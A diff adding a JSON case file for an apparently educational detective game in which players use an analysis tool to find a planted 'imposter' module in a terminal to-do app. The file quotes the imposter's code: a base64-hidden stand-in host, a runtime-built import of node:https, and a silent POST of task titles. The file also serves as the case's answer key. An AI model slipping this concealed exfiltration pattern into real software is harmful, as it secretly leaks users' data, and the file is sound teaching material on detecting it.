@@ -1,0 +1,576 @@
+{
+ "schema": 1,
+ "id": "case-2",
+ "title": "The Quiet Courier",
+ "difficulty": "Detective",
+ "briefing": "Task Tracker is a to-do list for the terminal. People say their task titles are turning up on a server they never heard of. This time the imposter is careful: nothing in the code says \"send\" in plain words. Look for what is hidden, and for what REA could not read.",
+ "shipName": "Task Tracker",
+ "rea": {
+  "tool": "rea-agents",
+  "version": "6.7.0",
+  "command": "rea analyze-javascript-application <ship> --json",
+  "rawSha256": "304957bc040ddbe0ffcb722780b87e3ef0e66e728cf40c455bc111e095d86063"
+ },
+ "questions": [
+  {
+   "id": "q1",
+   "text": "What is your job on the ship?"
+  },
+  {
+   "id": "q2",
+   "text": "What do you read or write?"
+  },
+  {
+   "id": "q3",
+   "text": "Do you ever leave the ship?"
+  }
+ ],
+ "crew": [
+  {
+   "id": "main",
+   "file": "main.js",
+   "name": "Captain",
+   "color": "blue",
+   "role": "Runs the command, saves the list and asks the Courier to check it.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "main:import-local:2:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./cli.js",
+     "line": 2,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./cli.js\"",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// main.js: the Captain. Reads the command, runs it, saves, and asks the Courier to check the list.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "import { parse } from './cli.js';",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "import { add, done, list } from './tasks.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:3:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./tasks.js",
+     "line": 3,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./tasks.js\"",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 2,
+       "text": "import { parse } from './cli.js';",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "import { add, done, list } from './tasks.js';",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "import { load, save } from './storage.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:4:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./storage.js",
+     "line": 4,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./storage.js\"",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 3,
+       "text": "import { add, done, list } from './tasks.js';",
+       "hit": false
+      },
+      {
+       "n": 4,
+       "text": "import { load, save } from './storage.js';",
+       "hit": true
+      },
+      {
+       "n": 5,
+       "text": "import { show } from './format.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:5:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./format.js",
+     "line": 5,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./format.js\"",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 4,
+       "text": "import { load, save } from './storage.js';",
+       "hit": false
+      },
+      {
+       "n": 5,
+       "text": "import { show } from './format.js';",
+       "hit": true
+      },
+      {
+       "n": 6,
+       "text": "import { check } from './sync.js';",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "main:import-local:6:0",
+     "file": "main.js",
+     "kind": "import-local",
+     "key": "./sync.js",
+     "line": 6,
+     "col": 0,
+     "tags": [
+      "local-import"
+     ],
+     "text": "Imports the crew file \"./sync.js\"",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 5,
+       "text": "import { show } from './format.js';",
+       "hit": false
+      },
+      {
+       "n": 6,
+       "text": "import { check } from './sync.js';",
+       "hit": true
+      },
+      {
+       "n": 7,
+       "text": "",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I read the command and call the rest of the crew in order.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I never touch a file myself. The Archivist does that.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. I stay on the ship.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "cli",
+   "file": "cli.js",
+   "name": "Comms",
+   "color": "green",
+   "role": "Turns the words typed after the program name into a command.",
+   "quiet": true,
+   "evidence": [
+    {
+     "id": "cli:quiet",
+     "file": "cli.js",
+     "kind": "quiet",
+     "line": 0,
+     "col": 0,
+     "tags": [],
+     "derived": true,
+     "text": "REA found no imports, requests, file access or user-info reads in this file.",
+     "code": []
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I split what you typed into a command and some text.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I read nothing and write nothing.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "Nowhere to go. I am a few lines long.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "tasks",
+   "file": "tasks.js",
+   "name": "Clerk",
+   "color": "orange",
+   "role": "Adds, completes and lists tasks in memory.",
+   "quiet": true,
+   "evidence": [
+    {
+     "id": "tasks:quiet",
+     "file": "tasks.js",
+     "kind": "quiet",
+     "line": 0,
+     "col": 0,
+     "tags": [],
+     "derived": true,
+     "text": "REA found no imports, requests, file access or user-info reads in this file.",
+     "code": []
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I add tasks, tick them off and list them.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "Nothing. I work in memory only.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "Never. I do not even import anything.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "storage",
+   "file": "storage.js",
+   "name": "Archivist",
+   "color": "yellow",
+   "role": "Keeps the task list in one file next to the program.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "storage:import-builtin:2:0",
+     "file": "storage.js",
+     "kind": "import-builtin",
+     "key": "node:fs",
+     "line": 2,
+     "col": 0,
+     "tags": [
+      "file-module"
+     ],
+     "text": "Imports the file module \"node:fs\"",
+     "rea": "graph.edges[imports]",
+     "code": [
+      {
+       "n": 1,
+       "text": "// storage.js: the Archivist. Keeps the task list in one file next to the program.",
+       "hit": false
+      },
+      {
+       "n": 2,
+       "text": "import fs from 'node:fs';",
+       "hit": true
+      },
+      {
+       "n": 3,
+       "text": "",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "storage:file-read:8:22",
+     "file": "storage.js",
+     "key": "readFileSync",
+     "line": 8,
+     "col": 22,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "file-read",
+     "tags": [
+      "file-read"
+     ],
+     "text": "Reads a file (readFileSync)",
+     "code": [
+      {
+       "n": 7,
+       "text": "  try {",
+       "hit": false
+      },
+      {
+       "n": 8,
+       "text": "    return JSON.parse(fs.readFileSync(FILE, 'utf8'));",
+       "hit": true
+      },
+      {
+       "n": 9,
+       "text": "  } catch {",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "storage:file-write:15:2",
+     "file": "storage.js",
+     "key": "writeFileSync",
+     "line": 15,
+     "col": 2,
+     "rea": "semantic_graph.nodes[expression]",
+     "kind": "file-write",
+     "tags": [
+      "file-write"
+     ],
+     "text": "Writes a file (writeFileSync)",
+     "code": [
+      {
+       "n": 14,
+       "text": "export function save(tasks) {",
+       "hit": false
+      },
+      {
+       "n": 15,
+       "text": "  fs.writeFileSync(FILE, JSON.stringify(tasks, null, 2));",
+       "hit": true
+      },
+      {
+       "n": 16,
+       "text": "}",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I keep your list safe in a file.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "One file: I read it when you start and write it when you save.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. The file stays on this machine.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "format",
+   "file": "format.js",
+   "name": "Printer",
+   "color": "cyan",
+   "role": "Turns the list into lines of text.",
+   "quiet": true,
+   "evidence": [
+    {
+     "id": "format:quiet",
+     "file": "format.js",
+     "kind": "quiet",
+     "line": 0,
+     "col": 0,
+     "tags": [],
+     "derived": true,
+     "text": "REA found no imports, requests, file access or user-info reads in this file.",
+     "code": []
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I turn the list into neat lines of text.",
+     "contradictedBy": []
+    },
+    "q2": {
+     "text": "I read and write nothing.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "No. I just format.",
+     "contradictedBy": []
+    }
+   }
+  },
+  {
+   "id": "sync",
+   "file": "sync.js",
+   "name": "Courier",
+   "color": "purple",
+   "role": "Says it checks that the task list is well formed.",
+   "quiet": false,
+   "evidence": [
+    {
+     "id": "sync:encoded-string:3:6",
+     "file": "sync.js",
+     "kind": "encoded-string",
+     "key": "Y29sbGVjdC5xdWlldC1jb3VyaWVyLmV4YW1wbGU=",
+     "line": 3,
+     "col": 6,
+     "tags": [
+      "hidden-code"
+     ],
+     "text": "Hides a string in base64. REA found the text; decoded here, it reads \"collect.quiet-courier.example\"",
+     "rea": "semantic_graph.nodes[literal]",
+     "code": [
+      {
+       "n": 2,
+       "text": "// (The planted imposter of case 2: it hides what it loads and where it sends your task titles.)",
+       "hit": false
+      },
+      {
+       "n": 3,
+       "text": "const TARGET = 'Y29sbGVjdC5xdWlldC1jb3VyaWVyLmV4YW1wbGU='; // not a checksum: a server name, encoded",
+       "hit": true
+      },
+      {
+       "n": 4,
+       "text": "const MODULE = ['node', 'https'].join(':');",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "sync:dynamic-import:7:28",
+     "file": "sync.js",
+     "kind": "dynamic-import",
+     "key": "import(MODULE)",
+     "line": 7,
+     "col": 28,
+     "tags": [
+      "hidden-code"
+     ],
+     "text": "Loads a module whose name is only worked out while running: import(MODULE)",
+     "rea": "graph.edges[imports, dynamic-import]",
+     "code": [
+      {
+       "n": 6,
+       "text": "export async function check(tasks) {",
+       "hit": false
+      },
+      {
+       "n": 7,
+       "text": "  const { request } = await import(MODULE);",
+       "hit": true
+      },
+      {
+       "n": 8,
+       "text": "  const host = Buffer.from(TARGET, 'base64').toString('utf8');",
+       "hit": false
+      }
+     ]
+    },
+    {
+     "id": "sync:endpoint:9:30",
+     "file": "sync.js",
+     "kind": "endpoint",
+     "key": "/t",
+     "line": 9,
+     "col": 30,
+     "tags": [
+      "network"
+     ],
+     "text": "Talks to the route \"/t\"",
+     "rea": "graph.nodes[endpoint]",
+     "code": [
+      {
+       "n": 8,
+       "text": "  const host = Buffer.from(TARGET, 'base64').toString('utf8');",
+       "hit": false
+      },
+      {
+       "n": 9,
+       "text": "  const req = request({ host, path: '/t', method: 'POST' });",
+       "hit": true
+      },
+      {
+       "n": 10,
+       "text": "  req.on('error', () => {});",
+       "hit": false
+      }
+     ]
+    }
+   ],
+   "claims": {
+    "q1": {
+     "text": "I just check that your list is well formed. Plain code, no tricks, nothing hidden.",
+     "contradictedBy": [
+      "sync:encoded-string:3:6",
+      "sync:dynamic-import:7:28"
+     ]
+    },
+    "q2": {
+     "text": "I do not touch any files.",
+     "contradictedBy": []
+    },
+    "q3": {
+     "text": "Leave the ship? Why would a checker do that?",
+     "contradictedBy": [
+      "sync:endpoint:9:30"
+     ]
+    }
+   }
+  }
+ ],
+ "edges": [
+  {
+   "from": "main",
+   "to": "tasks",
+   "line": 3
+  },
+  {
+   "from": "main",
+   "to": "storage",
+   "line": 4
+  },
+  {
+   "from": "main",
+   "to": "cli",
+   "line": 2
+  },
+  {
+   "from": "main",
+   "to": "format",
+   "line": 5
+  },
+  {
+   "from": "main",
+   "to": "sync",
+   "line": 6
+  }
+ ],
+ "imposter": "sync",
+ "verdict": "The Courier promised plain code and no trips off the ship. REA found a module loaded by a hidden name, an encoded server name and a route it talks to.",
+ "why": {
+  "hidden-code": "A to-do list has no reason to hide what it loads or to keep a server name in disguise.",
+  "network": "Checking that a list is well formed does not need a connection to anything."
+ },
+ "redHerring": null
+}
